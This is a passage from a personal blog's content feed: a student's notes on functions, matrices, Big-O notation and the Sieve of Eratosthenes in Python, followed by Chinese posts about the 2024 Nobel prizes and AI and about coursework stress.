bijective.</p><p>$f(x,y)=(x+y,x−y) invertible \iff bijective (Inj)(Sur)$</p><p>$(Inj)$ suppose f(x,y)=(x+y,x−y),f(w,v)=(w+v,w−v)</p><script type="math/tex; mode=display">\begin{cases}  x+y=w+v \\  x−y=w−v\end{cases}\implies\begin{cases}  2x=2w \\  2y=2v\end{cases}\implies(x,y)=(w,v)</script><p>$(Sur)$ for any $(m,n) \in \mathbb{R} \times \mathbb{R}$, we need to find (x,y), s.t. f(x,y)=(m,n)</p><p>f(x,y)=(x+y,x−y)=(m,n)</p><script type="math/tex; mode=display">\implies\begin{cases}  x+y=m \\  x−y=n\end{cases}\implies\begin{cases}  2x=m+n \\  2y=m-n\end{cases}\implies\begin{cases}  x=\frac{m+n}{2} \\  y=\frac{m-n}{2}\end{cases}</script><p><img src="/2024/10/11/Math/Functions/111.png" alt></p><h1 id="Matrices"><a href="#Matrices" class="headerlink" title="Matrices"></a>Matrices</h1><p>An m×n matrix is a rectangular array with m horizontal rows and n vertical columns.</p><script type="math/tex; mode=display">\begin{matrix}a_{11} & a_{12} & \dots & a_{13} \\a_{21} & a_{22} & \dots & a_{23} \\\vdots & \vdots &  & \vdots \\\a_{31} & a_{32} & \dots & a_{33}\end{matrix}</script><p>Take Notice</p><p>Matrices are important objects in Computer Science, e.g. for</p><ul><li>optimisation</li><li>graphics and computer vision</li><li>cryptography</li><li>information retrieval and web search</li><li>machine learning</li></ul><h2 id="Matrix-Motivation"><a href="#Matrix-Motivation" class="headerlink" title="Matrix Motivation"></a>Matrix Motivation</h2><p>Solvinglinearequations:</p><p>5x=15</p><hr><p>5x+3y = 15 and 4x−2y = 12</p><script type="math/tex; mode=display">A = \left\{\begin{matrix}5 & 3 \\4 & 2 \\\end{matrix}\right\}</script><script type="math/tex; mode=display">x = \left\{\begin{matrix}x\\y\\\end{matrix}\right\}</script><script type="math/tex; mode=display">b = \left\{\begin{matrix}15\\12\\\end{matrix}\right\}</script><p>hence</p><script type="math/tex; mode=display">Ax=b</script><hr><script type="math/tex; mode=display">x' = 5x+3y \quadx'' = 2x'+y'\\y' = 4x−2y \quady'' = 3x'+3y'</script><script type="math/tex; mode=display">A = \left\{\begin{matrix}5 & 3 \\4 & -2 \\\end{matrix}\right\}</script><script type="math/tex; mode=display">x = \left\{\begin{matrix}x\\y\\\end{matrix}\right\}</script><script type="math/tex; mode=display">x' = \left\{\begin{matrix}x'\\y'\\\end{matrix}\right\}</script><script type="math/tex; mode=display">B = \left\{\begin{matrix}2 & 1 \\3 & 3 \\\end{matrix}\right\}</script><script type="math/tex; mode=display">x'' = \left\{\begin{matrix}x''\\y''\\\end{matrix}\right\}</script><p>Then how to simultaneous equations?</p><h2 id="Basic-Matrix-Operations"><a href="#Basic-Matrix-Operations" class="headerlink" title="Basic Matrix Operations"></a>Basic Matrix Operations</h2><p>The $transpose A^T$ of an $m \times n$ matrix $A = [a<em>{ij}]$ is the $n \times m$ matrix whose entry in the ith row and jth column is $a</em>{ji}$.</p><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0 & 4 \\3 & 2 & -1 & 2 \\4 & 0 & 1 & 3 \end{bmatrix}</script><script type="math/tex; mode=display">A^T=\begin{bmatrix}2 & 3 & 4 \\-1 & 2 & 0 \\0 & -1 & 1 \\4 & 2 & 3 \\\end{bmatrix}</script><p>Take notice</p><p>A matrix <strong>M</strong> is called <strong>symmetric</strong> if M^T = M</p><h2 id="Matrix-Sum"><a href="#Matrix-Sum" class="headerlink" title="Matrix Sum"></a>Matrix Sum</h2><p>The <strong>sum</strong> of two $m \times n$ matrices $A = [a<em>{ij}]$ and $B = [b</em>{ij}]$ is the $m \times n$ matrix whose entry in the ith row and jth column is $a<em>{ij} +b</em>{ij}$.</p><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0 & 4 \\3 & 2 & -1 & 2 \\4 & 0 & 1 & 3\end{bmatrix}</script><script type="math/tex; mode=display">B=\begin{bmatrix}1 & 0 & 5 & 3 \\2 & 3 & -2 & 1 \\4 & -2 & 0 & 2\end{bmatrix}</script><script type="math/tex; mode=display">A+B=\begin{bmatrix}3 & -1 & 5 & 7 \\5 & 5 & -3 & 3 \\8 & -2 & 1 & 5\end{bmatrix}</script><p>Fact:</p><script type="math/tex; mode=display">A+B=B+A \quad and \quad (A+B)+C=A+(B+C)</script><h2 id="Scalar-Product"><a href="#Scalar-Product" class="headerlink" title="Scalar Product"></a>Scalar Product</h2><p>Given $m \times n$ matrix $A = [a<em>{ij}]$ and $c ∈ \mathbb{R}$, the <strong>scalar product</strong> <strong>cA</strong> is the $m \times n$ matrix whose entry in the ith row and jth column is $c · a</em>{ij}$.</p><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0 & 4 \\3 & 2 & -1 & 2 \\4 & 0 & 1 & 3\end{bmatrix}</script><script type="math/tex; mode=display">2A=\begin{bmatrix}4 & -2 & 0 & 8 \\6 & 4 & -2 & 4 \\8 & 0 & 2 & 6\end{bmatrix}</script><h2 id="Matrix-Product"><a href="#Matrix-Product" class="headerlink" title="Matrix Product"></a>Matrix Product</h2><p>The <strong>product</strong> of an $m \times n$ matrix $A = [a<em>{ij}]$ and an n×p matrix $B=[b</em>{jk}]$ is the $m \times p$ matrix $C = [c_{ik}]$ defined by</p><script type="math/tex; mode=display">c_{ik} = \Sigma^n_{j=1} a_{ij}b_{jk} \quad for \quad 1 ≤ i ≤ m \quad and \quad 1≤k≤p</script><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12} \\a_{21} & a_{22} \end{bmatrix}\cdot\begin{bmatrix}b_{11} & b_{12} \\b_{21} & b_{22} \end{bmatrix}=\begin{bmatrix}a_{11}b_{11}+a_{12}b_{21} & a_{11}b_{12}+a_{12}b_{22} \\a_{21}b_{11}+a_{22}b_{21} & a_{21}b_{12}+a_{22}b_{22}\end{bmatrix}</script><p>Take Notice</p><p>The number of <strong>columns</strong> of A must be the same as the number of <strong>rows</strong> of B. (口诀“一行二列反相等”)</p><p>The product of a $1 \times n$ matrix and an $n \times 1$ matrix is usually called the <strong>inner product</strong> of two <strong>n-dimensional vectors</strong>. One line matrix multiples one column matrix, we could obtain only a number. Note, the 1 means only number 1, it is only a scalar, and n means 1-dimensional vector, just like.</p><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12}\end{bmatrix} \text{ to be the } 1 \times n</script><p> matrix,<br>and </p><script type="math/tex; mode=display">\begin{bmatrix}b_{11}\\b_{21}\end{bmatrix}</script><p>to be the $n \times 1$ matrix. </p><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{21}\end{bmatrix}</script><p>to be the $1 \times n$ matrix.</p><p>Then </p><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12}\end{bmatrix}</script><p>$\cdot$ </p><script type="math/tex; mode=display">\begin{bmatrix}b_{11}\\b_{21}\end{bmatrix}</script><p>= $a<em>{11}b</em>{11} + a<em>{12}b</em>{21}$</p><p>It is the inner product, which is also resulting in a scalar.</p><p>Consider</p><script type="math/tex; mode=display">A=\begin{bmatrix}1 & 2 \\2 & 4\end{bmatrix}</script><script type="math/tex; mode=display">B=\begin{bmatrix}2 & -1 \\-6 & 3\end{bmatrix}</script><p>Calculate <strong>AB</strong>, <strong>BA</strong></p><script type="math/tex; mode=display">AB=\begin{bmatrix}-10 & 5 \\-20 & 10\end{bmatrix}</script><script type="math/tex; mode=display">BA=\begin{bmatrix}0 & 0 \\0 & 0\end{bmatrix}</script><p>Take Notice</p><p>In general, $A · B \neq B·A$</p><h3 id="Computer-Graphics"><a href="#Computer-Graphics" class="headerlink" title="Computer Graphics"></a>Computer Graphics</h3><p>Rotating an object w.r.t. the x axis by degree α:</p><p><img src="/2024/10/11/Math/Functions/2024-10-11-18-08-45.png" alt></p><hr><h1 id="Introduction-to-Big-O-Notation"><a href="#Introduction-to-Big-O-Notation" class="headerlink" title="Introduction to Big-O Notation"></a>Introduction to Big-O Notation</h1><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><p>Want to compare functions, particularly functions from $\mathbb{N}$ to $\mathbb{R}$</p><p>Options</p><ul><li>Equality: $f(n) = g(n)$ for all n</li><li>(Pointwise) comparison: $f(n) ≤ g(n)$ for all n</li><li>(Almost all) comparison:  $f(n) ≤ g(n)$ for all but finitely many n</li><li>Asymptotic growth: $lim_{n-&gt;\infin} \frac{f(n)}{g(n)}$</li></ul><h3 id="example-Algorithmic-analysis"><a href="#example-Algorithmic-analysis" class="headerlink" title="example: Algorithmic analysis"></a>example: Algorithmic analysis</h3><p>Want to compare algorithms– particularly ones that can solve arbitrarily large instances.</p><p>We would like to be able to talk about the resources (running time, memory, energy consumption) required by a program/algorithm as a function f (n) of some parameter n (e.g. the size) of its input.</p><p>e.g. How long does a given sorting algorithm take to run on a listof n elements?</p><p>Issues</p><p>The exact resources required for an algorithm are difficult to pin down. Heavily dependent on:</p><ul><li><p>Environment the program is run in (hardware, choice of language, external factors, etc)</p></li><li><p>Choice of inputs used</p></li></ul><p>Cost functions can be complex, e.g.</p><script type="math/tex; mode=display">2n log(n) + (n-100)log(n)^2 + \frac{1}{2^n} log(log(n))</script><p>Need to identify the “important” aspects of the function.</p><p>Look at the <strong>asymptotic growth</strong>: how do the costs <strong>scale</strong> as n gets large?</p><h2 id="“Big-O”-Asymptotic-Upper-Bounds"><a href="#“Big-O”-Asymptotic-Upper-Bounds" class="headerlink" title="“Big-O” Asymptotic Upper Bounds"></a>“Big-O” Asymptotic Upper Bounds</h2><p>Definition:</p><p>Let $f,g:\mathbb{N} → \mathbb{R}_{≥0}$. We say that g is asymptotically less than f (or: <em>f is an upper bound of g</em>) if there exists $n_0 \in \mathbb{N}$ and a real constant $c &gt; 0$ such that for all $n ≥ n_0$,</p><script type="math/tex; mode=display">g(n) \leq  c \cdot f(n)</script><p>Write O(f(n)) for the class of all functions g that are asymptotically less than f .</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>g(n) = 3n+1 ⇒ g(n)≤4n, for all n ≥1</p><p>Therefore, 3n + 1 ∈ O(n)</p><script type="math/tex; mode=display">\frac{1}{10} n^2 \in O(n^2) \\10n log n \in O(n log n) \\O(n log n) \nsubseteq O(n^2)</script><p>$O(n log n)$ is different from $O(n^2)$</p><p>Note! The traditional notation has been</p><p><strong>g(n) = O(f(n))</strong></p><p>instead of <strong>g(n) ∈ O(f(n))</strong>.</p><p>It allows one to use O(f(n)) or similar expressions as part of an equation; of course these ‘equations’ express only an approximate equality. Thus,</p><script type="math/tex; mode=display">T(n) = 2·T(\frac{n}{2}) + O(n)</script><p>means  “There exists a function $f (n) ∈ O(n)$ such that $T(n) = 2T(\frac{n}{2}) + f(n)$.”</p><p><img src="/2024/10/11/Math/Functions/BigOh.png" alt></p><h2 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h2><p>Suppose f (n) ∈ O(g(n)), g(n) ∈ O(h(n)) and j(n) ∈ O(k(n)).</p><p>Then:</p><ul><li>f(n) ∈ O(h(n))</li><li>f(n) +j(n) ∈ O(g(n)+k(n))</li><li>f(n) · j(n) ∈ O(g(n) · k(n))</li></ul><h3 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h3><script type="math/tex; mode=display">5n^2 +3 n+2 ∈ O(n^2)\\n^3 +2^{100}n^2 +2n +2^{2^{100}} ∈ O(n^3)</script><p>Generally, for constants $a_k … a_0$,</p><script type="math/tex; mode=display">a_kn^k + a_{k-1}n^{k-1} + \dots + a_0 \in O(n^k)</script><h2 id="“Big-Omega”-Asymptotic-Lower-Bounds"><a href="#“Big-Omega”-Asymptotic-Lower-Bounds" class="headerlink" title="“Big-Omega” Asymptotic Lower Bounds"></a>“Big-Omega” Asymptotic Lower Bounds</h2><p>Definition</p><p>Let $f,g : \mathbb{N} → \mathbb{R}$. We say that g is asymptotically greater than f (or: <strong>f is an lower bound of g</strong>) if there exists $n_0 ∈ \mathbb{N}$ and a real constant c &gt; 0 such that for all $n ≥ n_0$</p><script type="math/tex; mode=display">g(n) ≥ c ·f(n)</script><p>Write $\Omega(f(n))$ for the class of all functions g that are asymptotically greater than f.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>g(n) = 3n+1 ⇒ g(n)≥3n, for all n ≥1</p><p>Therefore, 3n + 1 ∈ Ω(n)</p><h2 id="“Big-Theta”-Notation"><a href="#“Big-Theta”-Notation" class="headerlink" title="“Big-Theta” Notation"></a>“Big-Theta” Notation</h2><p>Definition</p><p>Two functions f,g have the same order of growth, or are <strong>asymptotically equivalent</strong>, if they scale up in the same way:<br>There exists $n_0 ∈ \mathbb{N}$ and real constants c &gt; 0, d &gt; 0 such that for all $n ≥ n_0$,</p><script type="math/tex; mode=display">c · f (n) ≤ g(n) ≤ d ·f(n)</script><p>Write Θ(f(n)) for the class of all functions g that have the same order of growth as f .</p><p>If g ∈ O(f) (or Ω(f)) we say that f is an upper bound (lower bound) on the order of growth of g; if g ∈ Θ(f) we call it a <strong>tight bound</strong>.</p><p><img src="/2024/10/11/Math/Functions/2024-10-12-09-24-05.png" alt></p><h3 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h3><p>Observe that, somewhat symmetrically</p><p>g∈Θ(f) ⇐⇒ f ∈Θ(g)</p><p>We obviously have</p><p>Θ(f(n)) ⊆ O(f(n)) and Θ(f(n)) ⊆ Ω(f(n)),</p><p>in fact</p><p>Θ(f(n)) = O(f(n)) ∩ Ω(f(n)).</p><p>At the same time the ‘Big-Oh’ is not a symmetric relation</p><p>g ∈O(f) ̸⇒ f ∈O(g),</p><p>but</p><p>g ∈O(f) ⇔f ∈Ω(g)</p><h3 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h3><p>For all k,ϵ &gt; 0:</p><script type="math/tex; mode=display">O((log n)^k) ⊊ O(n^ϵ) \quad and \quad O(n^k) ⊊ O((1+ϵ)^n).</script><p>All logarithms have the same order, irrespective of base:</p><script type="math/tex; mode=display">O(log_2 n) = O(log_3n) = ... = O(log_{10}n) = ...</script><p>Exponentials to different bases have different orders:</p><script type="math/tex; mode=display">O(r^n) ⊊ O(s^n) ⊊ O(t^n) ... \quad for \quad r < s < t...</script><p>Similarly for polynomials</p><script type="math/tex; mode=display">O(n^k) ⊊ O(n^l) ⊊ O(n^m) ... \quad for \quad k < l < m...</script><h4 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h4><p>Here are some of the most common functions occurring in the analysis of the performance of programs (algorithm complexity), arranged in increasing asymptotic growth:</p><script type="math/tex; mode=display">1, log log n, log n, √n, √n(log n), n, n(log log n), nlogn,n√n, n^2, n^2 logn, n^3, n^{12}, 2^{√n}, 1.01^n, 2^n, 3^n, n!, n^n, 2^{n^2},...</script><p>Take Notice</p><p>$O(1) ≡ const$, although technically it could be any function that varies between two constants c and d.</p><h4 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises"></a>Exercises</h4><p>Q: True or false?</p><script type="math/tex; mode=display">(a) 2^{n+1}∈O(2^n) \\(b) (n+1)^2 ∈ O(n^2) \\(c) 2^{2n} ∈ O(2^n) \\(d) (200n)^2 ∈ O(n^2) \\(b) log(n^{73})∈O(log n) \\(c) log(n^n) ∈ O(log n) \\(d) (√n+1)^4 ∈ O(n^2)</script><p>A:<br>TTF-&gt;$O(4^n)$<br>TTFT</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sieve of Eratosthenes</title>
      <link href="/2024/10/11/Math/Sieve-of-Eratosthenes/"/>
      <url>/2024/10/11/Math/Sieve-of-Eratosthenes/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#sieve-of-eratosthenes">Sieve of Eratosthenes</a></li><li><a href="#the-algorithm">The algorithm</a><ul><li><a href="#step-1">step 1</a></li><li><a href="#step-2">step 2</a></li><li><a href="#step-3">step 3</a></li></ul></li><li><a href="#confusion">Confusion</a><ul><li><a href="#why-external-loops-range-is-range2-floorsqrtn--1">why external loop’s range is range(2, floor(sqrt(n)) + 1)</a></li><li><a href="#why-internal-loop-from-rangep--p-n--1-p">why internal loop from range(p * p, n + 1, p)</a></li><li><a href="#why-sieve-of-eratosthenes-could-find-primes">Why Sieve of Eratosthenes could find primes</a></li></ul></li></ul><h1 id="Sieve-of-Eratosthenes"><a href="#Sieve-of-Eratosthenes" class="headerlink" title="Sieve of Eratosthenes"></a>Sieve of Eratosthenes</h1><p>At the first to know Sieve of <a href="https://en.wikipedia.org/wiki/Sieve_of_Eratosthenes">Eratosthenes</a>, it was a snippet in a quiz of python project in UNSW.</p><p>The sieve of Eratosthenes is an ancient algorithm for finding all prime numbers up to any given limit.</p><p>The code below would generate a list in the range of <a href="n included">2, n</a>. It is very fast and convenient, with just a little memory and time-consumption.</p><pre><code class="lang-python">def sieve_of_primes_up_to(n):    sieve = [True] * (n + 1)    # Note, the actual range is inclusive [2, floor(sqrt(n))]    # the &quot;floor(sqrt(n)) + 1)&quot; is just statisfy python&#39;s list range.    for p in range(2, floor(sqrt(n)) + 1):        if sieve[p]:            for i in range(p * p, n + 1, p):                sieve[i] = False    sieve[0] = False    sieve[1] = False    sieve_primes_list = [i for i in range(n + 1) if sieve[i]]    return sieve_primes_list</code></pre><h1 id="The-algorithm"><a href="#The-algorithm" class="headerlink" title="The algorithm"></a>The algorithm</h1><h2 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h2><p>Firstly, set all numbers are True:</p><p>[2:T, 3:T, 4:T, 5:T, … , n]</p><h2 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h2><p>Secondly, from 2 to the $\lfloor \sqrt{n} \rfloor$, set the multiples of the least prime as the Composite Number from its perfect number.</p><p>E.g. now the existed list is </p><p>[2:T, 3:T, 4:T, 5:T, … , n]</p><p>Then set the current number is 2, set its perfect number (namely 2<em>2==4), then set 2</em>3==6, 2<em>4==8, 2</em>5==10 … In conclusion, set 4th, 6th, 8th, 10th, …,  as composite numbers (namely False status) step by step.</p><p>After finishing 2, then find next number, namely 3, hence set 3<em>3, 3</em>4, 3*5, … . set 9th, 12th, 15th, … numbers as false.</p><p>Until the number: $\lfloor \sqrt{n} \rfloor$ [Namely py code expression: floor(sqrt(n))]</p><h2 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h2><p>Thirdly, return the list with boolean values.</p><h1 id="Confusion"><a href="#Confusion" class="headerlink" title="Confusion"></a>Confusion</h1><h2 id="why-external-loop’s-range-is-range-2-floor-sqrt-n-1"><a href="#why-external-loop’s-range-is-range-2-floor-sqrt-n-1" class="headerlink" title="why external loop’s range is range(2, floor(sqrt(n)) + 1)"></a>why external loop’s range is range(2, floor(sqrt(n)) + 1)</h2><p>And the inclusive range <code>[2, floor(sqrt(n))]</code> is the actual range.</p><p>For the least limit, cause 2 is the least prime number.</p><p>For the largest limit, the “range(floor(sqrt(n)) + 1)” is just statisfy python’s list range, remeber the last limit number should add 1.</p><p>The original code I firstly saw is <code>for p in range(2, round(sqrt(n)) + 1):</code>, I think round() is used redundantly.</p><p>Because the internal loop <strong>i</strong> starts with $p \times p$, which means the largest number in the internal loop would be $\sqrt{n}$. And $i^2$ shouldn’t be beyond the n, that is meaningless. </p><p>For example, if n==5, and $\sqrt{5} \approx 2.24$, we can compute $2 \times 2 = 4$, because it is under 5, and computing $3 \times 3 = 9$ is pointless because it’s beyond the n (namely 5).</p><p>Obviously, the difference between $n^2$ and $(n+1)^2$ is much larger than 1.</p><p>Hence, we’d better use <code>floor(sqrt(n))</code> as the largest number of the external range, rather not <code>round(sqrt(n))</code>. Round is rounding, which may make one unnecessary number comsumption.</p><p>I ran a program to distinguish the nuance of it:</p><pre><code class="lang-python">def sieve_of_primes_up_to(n):    sieve = [True] * (n + 1)    try:        # Note Here!        for p in range(2, round(sqrt(n)) + 1):        # for p in range(2, floor(sqrt(n)) + 1):            if sieve[p]:                for i in range(p * p, n + 1, p):                    sieve[i] = False    finally:        # Note Here!        print(p)    sieve[0] = False    sieve[1] = False    sieve_primes_list = [i for i in range(n + 1) if sieve[i]]    return sieve_primes_list</code></pre><p>When the test cases are [8, 11, 20, 4321, 98_234, 980_234, 50_000_000]</p><p>the obviously different outputs of the final p are:</p><pre><code>for p in range(2, floor(sqrt(n)) + 1):23465313990------for p in range(2, round(sqrt(n)) + 1):33466313990</code></pre><p>But they have the same prime numbers of different n, to <code>print(len(sieve_prime_list))</code>:</p><pre><code>for p in range(2, floor(sqrt(n)) + 1):458590943477082---------------for p in range(2, round(sqrt(n)) + 1):458590943477082</code></pre><p>PS: Oh, I think the proof is not much useful … The bound of the parameter wont induce real redundant computing, because it is too simple just like the code below won’t run redundantly:</p><pre><code class="lang-python">for i in range(4,2,1): print()</code></pre><h2 id="why-internal-loop-from-range-p-p-n-1-p"><a href="#why-internal-loop-from-range-p-p-n-1-p" class="headerlink" title="why internal loop from range(p * p, n + 1, p)"></a>why internal loop from range(p * p, n + 1, p)</h2><p>At the first, I was confused by the p * p as the start. Then I realized that the number under p had computed with $p$ before the new $i$ of $p \times p$.</p><p>Let’s make a diagram.</p><p>Let n=20:</p><p>The actual prime list is:</p><p>[2,3,5,7,11,13,17,19]</p><p>We follow the program to compute from 2 to $\sqrt{20} \approx 4.47$ whose floor number is 4.</p><p>2: [4,6,8,10,12,14,16,18,20]</p><p>3: [9,12,15,18]</p><p>4: [16,20]</p><p>Ok, if we assume $i$ doesn’t start with $p \times p$, $i$ just is from multipling 2,3,4,… .</p><p>For example, $i = 4$, we need to compute 4*2, we found $4 \times 2$ has been computed at the step of $i = 4$.</p><p>So starting with $p \times p$ is a way to reduce redundancy.</p><h2 id="Why-Sieve-of-Eratosthenes-could-find-primes"><a href="#Why-Sieve-of-Eratosthenes-could-find-primes" class="headerlink" title="Why Sieve of Eratosthenes could find primes"></a>Why Sieve of Eratosthenes could find primes</h2><p>Just follow the <strong>definition</strong> of <strong>Prime Number</strong> on Wiki.</p><p>  A prime number (or a prime) is a natural number greater than 1 that is not a product of two smaller natural numbers.</p><p>We would see <strong>Sieve of Eratosthenes</strong> just followed definition to find primes. It finds every products of numbers that won’t become primes, hence the numbers left are just primes.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>论诺奖与AI</title>
      <link href="/2024/10/11/trivia/%E8%AE%BAAI/"/>
      <url>/2024/10/11/trivia/%E8%AE%BAAI/</url>
      
        <content type="html"><![CDATA[<p>今年2024年的诺贝尔奖揭开帷幕，物理奖和化学奖都颁给了发明AI反辅交叉学科的科学家。AI之父接电话时回答“A bolt from the blue”。</p><p>今年科学奖的物理和化学都给了交叉学科的AI课题研究者。</p><h1 id="physics"><a href="#physics" class="headerlink" title="physics"></a>physics</h1><p>for foundational discoveries and inventions that enable machine learning with artificial neural networks</p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-14-42.png" alt="John J. Hopfield"></p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-14-52.png" alt="Geoffrey E. Hinton"></p><h1 id="chemistry"><a href="#chemistry" class="headerlink" title="chemistry"></a>chemistry</h1><p>for protein structure prediction</p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-15-56.png" alt="David Baker"></p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-16-10.png" alt="Demis Hassabis"></p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-16-18.png" alt="John M. Jumper"></p><hr><p>目前看来，交叉学科确实比较容易出成绩，也容易拿诺奖，中国国内很多同学都在研究交叉学科，用AI解决各种各样的问题，比如用AI做医学课题，还是很有希望拿诺奖的。</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>由于人类的思考过程和计算机程序运行大致相当，需要输入（听、阅读）、处理（思考，领悟）、输出（说话、写作），但是人类的IO运行时间和效率远低于计算机，脑机接口的问世将带来人类IO的解放。我所看，我所想，我所言，都很容易通过脑机接口节省IO时间，在网络上和别人交流，进而促进人类解放和社会进步。但是，人类再怎么解放，都没办法随时随地像个程序一样，对一些重复性大的工作进行不间断的判断，这是一个天然的缺口，人类再进化几万年，依然会出现“需要比较聪明的东西做重复性的工作”。</p><p>AI是解放劳动力的不可替代的缺口。相比人类，AI可以持续的做出比较聪明、智慧的判断。诸如《三体》所言，未来太空舰队的作战时间以“秒”为单位，人类不可能通过口口相传来指挥超大规模舰队，只有AI充分发展，才有可能进行未来的建设、指挥、超复杂机器的运行维护。</p><h1 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h1><p>1.人类无法拒绝AI，谁拒绝AI谁就是反人类。</p><p>2.AI需要道德监督，必须培养健康成长的AI。</p><p>3.现在的大预言模型等AI算法依然有进步空间，只能处理基本的文字信息、代码撰写，但是再高级点的事情可能不太好做。必须多研究下数学，有信息做一个更高级的AI。</p><p>4.可惜中国还是没有再获诺贝尔科学奖，这届诺奖科学奖基本都是美国人。如果选择做研究，还是尽量能留在国外就留在国外。</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自我吐槽</title>
      <link href="/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/"/>
      <url>/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/</url>
      
        <content type="html"><![CDATA[<p>最近就是个焦虑，自我pua的高压状态，发现这种状态不可长时间维持，遂摆两天歇歇，已缓精神紧张问题。</p><p>10月2号到7号，一直在焦虑的写作业，其中数学学到了概念繁多的relation，我写了两篇笔记，花了三天时间才把lecturor Paul讲的东西（三个video recordings）写成在线的数学笔记，消化其中的各种知识点花费了很长时间。期间晚上没有0点之前睡过，当时自我PUA，学习tex语法调试blog各种参数，各种压力下，精神太紧绷。总算好的是，7号把各种quiz写完了。好的是，那个quiz几乎全对；坏的是，我错了一个小选项丢了一分，因为当时对“0是否是自然数”，我上网搜，发现网上说1才是最小的自然数，但是Ed Forum上说“0是最小的自然数”，在Jiaojiao给的PPT上就有。</p><p>但是睡起来，7号来着，不小心一个失误操作，把blog全删了。。</p><p><img src="/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/2024-10-10-18-16-14.png" alt></p><p><img src="/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/2024-10-10-18-16-32.png" alt></p><p>当时心情复杂，极度复杂，索性开摆，去学校转了转，缓解下心情。一整天没再理blog。</p><p>后来，发现自己用Vmware几个月前打了一个快照，两个月前的blog还在，花了两天把blog系统恢复后，实在是依然难受和焦虑。那个很复杂的relation2的数学笔记还得重新写一下，补了自己过去的blog，copy自己，算是把blog抢救回来了。怪自己没有提前发现hexo的部署缺陷，就应该自己多个心眼，对blog这种原创性强的东西上传到github上进行备份。</p><p>下午写算法quiz，一不小心错两个题，我事后诸葛亮跳起来骂自己。无缘无故丢两分，怪自己没提前准备，怪自己做的时候怎么那么多时间也没有反应过来题目的正确答案？推理都推了那么长时间了，却总是一点点小失误给自己整破防。</p><p>8号晚上，一口气三个小时把python的trinumber给写完了，反复调试了下，学到profile功能、数学分解功能，终于以瞬间运行的算法把作业写完了：</p><p>写程序做大数分解，一开始以为我用list，布尔过滤器一类的东西大力出奇迹，后来发现时间复杂度使计算极度复杂，内存也很差，在一些性能差点的机器都跑不通。用ide的profile检查了下各模块运行时间，对照了一些我没验证的想法，想了想还是算法本身问题。</p><p>​对脑袋里一开始没想清楚的细节进行了数学验证和简化后，思路变得极度清晰，改了改代码，从4分钟跑一个数变成了秒出大数结果。</p><p>算是苦中作乐，总得想办法把自己的生物钟、紧绷的精神状态调整过来，才能迎接下周的期中考试。</p><p>自己再想想，应该多谨慎多推敲，下次避免奇奇怪怪的各种错误。</p><p>好了，自己给自己规定9点之后不再使用各种电子设备，避免蓝光刺激精神导致影响睡眠。</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>relation(2)</title>
      <link href="/2024/10/06/Math/relation-2/"/>
      <url>/2024/10/06/Math/relation-2/</url>
      
        <content type="html"><![CDATA[<p>Last week Paul took 3 lectures to teach the relations. The concepts are a little many for newers, and I spent 4 days to understand what he taught.</p><p><img src="/2024/10/06/Math/relation-2/math-relation-lecture6.png" alt></p><ul><li><a href="#equivalence-relations-rst">Equivalence Relations (R)(S)(T)</a><ul><li><a href="#definition-of-equivalence-relation">definition of Equivalence Relation</a></li></ul></li><li><a href="#equivalence-classes">Equivalence Classes</a></li><li><a href="#partitions">Partitions</a><ul><li><a href="#examples">examples</a></li></ul></li><li><a href="#partial-orders-rast">Partial Orders (R),(AS),(T)</a><ul><li><a href="#examples-1">examples</a></li></ul></li><li><a href="#hasse-diagram">Hasse diagram</a></li><li><a href="#ordering">Ordering</a><ul><li><a href="#minimal-maximal-minimum-maximum">Minimal, Maximal, Minimum, Maximum</a></li><li><a href="#examples-2">Examples</a></li><li><a href="#upper-bound--lower-bound-lub-glb">upper bound,  lower bound, lub, glb</a></li><li><a href="#lub-glb">lub, glb</a><ul><li><a href="#example">Example</a></li></ul></li><li><a href="#lattice-and-complete-lattice">lattice and complete lattice</a><ul><li><a href="#example-1">example</a></li></ul></li></ul></li><li><a href="#total-orders">Total orders</a><ul><li><a href="#example-2">example</a></li></ul></li><li><a href="#ordering-of-a-poset">Ordering of a Poset</a><ul><li><a href="#topological-sort">Topological 